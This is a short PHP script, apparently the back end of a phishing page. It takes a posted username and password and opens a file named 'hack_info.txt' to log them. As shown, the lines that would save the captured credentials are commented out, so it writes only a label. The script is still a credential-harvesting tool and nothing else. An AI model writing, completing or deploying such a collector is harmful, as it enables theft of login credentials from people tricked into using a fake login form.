<?
    $username = $_POST['fname'];
    $password = $_POST['pass'];
    $file = fopen("hack_info.txt","a");
    fwrite($file,"Username : ");
    // fwrite($file,$username ."\n");
    // fwrite($file,"Password : ");
    // fwrite($file,$password);
    fclose($file);
?>